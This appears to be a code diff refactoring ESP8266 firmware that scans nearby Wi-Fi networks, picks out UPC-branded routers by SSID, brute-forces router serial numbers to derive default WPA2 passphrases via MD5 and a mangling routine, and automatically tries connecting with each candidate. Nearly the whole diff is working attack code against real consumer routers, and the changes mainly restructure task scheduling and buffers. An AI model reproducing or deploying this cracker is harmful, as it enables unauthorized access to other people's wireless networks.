@@ -10,13 +10,13 @@ typedef struct {
   uint32_t target;
   unsigned char essid[32];
   uint8_t bssid[6];
-  uint8_t password[8];
+  uint8_t password[9];
   bool cracking;
   uint8_t tested;
 } ap_t;
 
 // counter for APs seen
-size_t last_ap;
+size_t aps_found;
 ap_t aps[MAX_APS] = {0};
 
 enum {
@@ -26,12 +26,11 @@ enum {
     CONNECTING,
 } state;
 
-size_t ap_to_crack;
 size_t ap_timeouts;
 static void crack(os_event_t *events);
 static void targets_found(void* arg, STATUS status);
 
-#define user_procTaskQueueLen 2
+#define user_procTaskQueueLen 1
 os_event_t user_procTaskQueue[user_procTaskQueueLen];
 
 ICACHE_FLASH_ATTR
@@ -64,39 +63,37 @@ targets_found(void* arg, STATUS status){
                 os_printf("\n");
             }
         }
-        if(!found && last_ap < MAX_APS){
+        if(!found && aps_found < MAX_APS){
+            aps_found++;
             os_printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %s\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid);
-            memcpy(aps[last_ap].bssid, bss_link->bssid, 6);
-            memcpy(aps[last_ap].essid, bss_link->ssid, 32);
+            memcpy(aps[aps_found-1].bssid, bss_link->bssid, 6);
+            memcpy(aps[aps_found-1].essid, bss_link->ssid, 32);
             if(strncmp(bss_link->ssid, "UPC", 3) == 0 && strlen(bss_link->ssid) == 10){
-                aps[last_ap].target = 0;
+                aps[aps_found-1].target = 0;
                 for(i = 3; i < 10; i++){
-                    aps[last_ap].target *= 10;
-                    aps[last_ap].target += bss_link->ssid[i]-0x30;
+                    aps[aps_found-1].target *= 10;
+                    aps[aps_found-1].target += bss_link->ssid[i]-0x30;
                 }
-                ap_to_crack = last_ap;
                 state = CRACKING;
-                system_os_task(crack, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-                system_os_post(USER_TASK_PRIO_0, 0, 0 );
+                system_os_post(PRIO_CRACK, 0, (os_param_t) aps_found -1);
                 // break here to avoid starting another cracking task
-                last_ap++;
                 return;
             }
-            last_ap++;
         }
         bss_link = bss_link->next.stqe_next;
     }
     state = SCANNING;
-    system_os_task(scan, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_post(USER_TASK_PRIO_0, 0, 0 );
+    system_os_post(PRIO_SCAN, 0, 0 );
 }
 
-char candidate_passwords[8][MAX_CANDIDATE_PASSWORDS];
+char candidate_passwords[9][MAX_CANDIDATE_PASSWORDS];
 size_t current_password, passwords_found;
 
 ICACHE_FLASH_ATTR
 static void test_passwords(os_event_t *events){
     size_t i;
+    size_t ap_to_crack = (size_t) events->par;
+
     if(state != CONNECTING){
         os_printf("Error: not in connecting state\n");
         return;
@@ -116,11 +113,10 @@ static void test_passwords(os_event_t *events){
             memcpy(aps[ap_to_crack].password, "<UNKNOWN>", 9);
         }
         state = SCANNING;
-        system_os_task(scan, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-        system_os_post(USER_TASK_PRIO_0, 0, 0 );
         if(ap_timeouts == MAX_TIMEOUTS){
             ap_timeouts = 0;
         }
+        system_os_post(PRIO_SCAN, 0, 0 );
         return;
     }
 
@@ -171,8 +167,7 @@ static void test_passwords(os_event_t *events){
             break;
          }
     }
-    system_os_task(test_passwords, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_post(USER_TASK_PRIO_0, 0, 0 );
+    system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack );
 }
 
 ICACHE_FLASH_ATTR
@@ -186,12 +181,15 @@ void user_init()
 
     system_update_cpu_freq(SYS_CPU_160MHZ);
 
-    last_ap = 0;
+    // set up tasks
+    system_os_task(scan, PRIO_SCAN, user_procTaskQueue, user_procTaskQueueLen);
+    system_os_task(crack, PRIO_CRACK, user_procTaskQueue, user_procTaskQueueLen);
+    system_os_task(test_passwords, PRIO_TEST, user_procTaskQueue, user_procTaskQueueLen);
 
     // start scanning
+    aps_found = 0;
     state = SCANNING;
-    system_os_task(scan, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_post(USER_TASK_PRIO_0, 0, 0 );
+    system_os_post(PRIO_SCAN, 0, 0 );
 
 }
 
@@ -276,6 +274,7 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 
 ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
+    size_t ap_to_crack = (size_t) events->par;
     uint32_t buf[4];
     char serial[64];
     char pass[9], tmpstr[17];
@@ -287,64 +286,67 @@ static void crack(os_event_t *events){
         os_printf("Error: not in cracking state\n");
         return;
     }
+    if(aps[ap_to_crack].password[0]){
+        os_printf("Already cracked this AP (%s)\n", aps[ap_to_crack].essid);
+    } else if(aps[ap_to_crack].target){
+        memset(candidate_passwords, 0x0, sizeof(candidate_passwords));
 
-    if(!aps[ap_to_crack].target){
-        return;
-    }
-    memset(candidate_passwords, 0x0, sizeof(candidate_passwords));
+        // breaks the rules by doing a lot of work all at once
+        for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
+            os_printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
+        for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
+        for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
+        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
+            // feed the watchdog so it doesn't reset us
+            system_soft_wdt_feed();
 
-    // breaks the rules by doing a lot of work all at once
-	for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
-        os_printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
-	for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
-	for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
-	for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
-        // feed the watchdog so it doesn't reset us
-        system_soft_wdt_feed();
+            if (upc_generate_ssid(buf, MAGIC_24GHZ) != aps[ap_to_crack].target)
+                continue;
 
-        if (upc_generate_ssid(buf, MAGIC_24GHZ) != aps[ap_to_crack].target)
-            continue;
+            os_sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
 
-        os_sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
+            MD5_Init(&ctx);
+            MD5_Update(&ctx, serial, strlen(serial));
+            MD5_Final(h1, &ctx);
 
-        MD5_Init(&ctx);
-        MD5_Update(&ctx, serial, strlen(serial));
-        MD5_Final(h1, &ctx);
+            for (i = 0; i < 4; i++) {
+                hv[i] = *(uint16_t *)(h1 + i*2);
+            }
 
-        for (i = 0; i < 4; i++) {
-            hv[i] = *(uint16_t *)(h1 + i*2);
+            w1 = mangle(hv);
+
+            for (i = 0; i < 4; i++) {
+                hv[i] = *(uint16_t *)(h1 + 8 + i*2);
+            }
+
+            w2 = mangle(hv);
+
+            os_sprintf(tmpstr, "%08X%08X", w1, w2);
+
+            MD5_Init(&ctx);
+            MD5_Update(&ctx, tmpstr, strlen(tmpstr));
+            MD5_Final(h2, &ctx);
+
+            hash2pass(h2, pass);
+            os_printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
+            memcpy(candidate_passwords[cnt], pass, 8);
+
+            cnt++;
+            if(cnt == MAX_CANDIDATE_PASSWORDS){
+                break;
+            }
+        }
         }
 
-        w1 = mangle(hv);
-
-        for (i = 0; i < 4; i++) {
-            hv[i] = *(uint16_t *)(h1 + 8 + i*2);
-        }
-
-        w2 = mangle(hv);
-
-        os_sprintf(tmpstr, "%08X%08X", w1, w2);
-
-        MD5_Init(&ctx);
-        MD5_Update(&ctx, tmpstr, strlen(tmpstr));
-        MD5_Final(h2, &ctx);
-
-        hash2pass(h2, pass);
-        os_printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
-        memcpy(candidate_passwords[cnt], pass, 8);
-
-		cnt++;
-        if(cnt == MAX_CANDIDATE_PASSWORDS){
-            break;
-        }
+        // switch to testing the passwords
+        os_printf("Testing generated passwords\n");
+        current_password = 0;
+        passwords_found = cnt-1;
+        state = CONNECTING;
+        system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack);
+    } else {
+        os_printf("Not a target\n");
+        state = SCANNING;
+        system_os_post(PRIO_SCAN, 0, 0 );
     }
-    }
-
-    // switch to testing the passwords
-    os_printf("Testing generated passwords\n");
-    current_password = 0;
-    passwords_found = cnt;
-    state = CONNECTING;
-    system_os_task(test_passwords, USER_TASK_PRIO_0, user_procTaskQueue, user_procTaskQueueLen);
-    system_os_post(USER_TASK_PRIO_0, 0, 0 );
 }
